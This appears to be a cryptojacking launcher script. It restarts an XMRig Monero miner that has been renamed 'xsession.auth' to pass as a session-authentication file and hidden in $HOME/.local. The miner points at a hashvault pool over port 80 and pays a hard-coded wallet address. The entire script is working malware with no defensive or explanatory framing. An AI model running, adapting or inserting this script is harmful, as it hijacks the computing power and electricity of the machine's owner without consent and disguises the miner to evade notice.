#!/bin/bash

XMRIGNAME=xsession.auth
WALLET=41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ
LOCAL_PATH=$HOME/.local
POOL=pool.hashvault.pro:80

pkill $XMRIGNAME
$LOCAL_PATH/$XMRIGNAME -o $POOL -u $WALLET --coin monero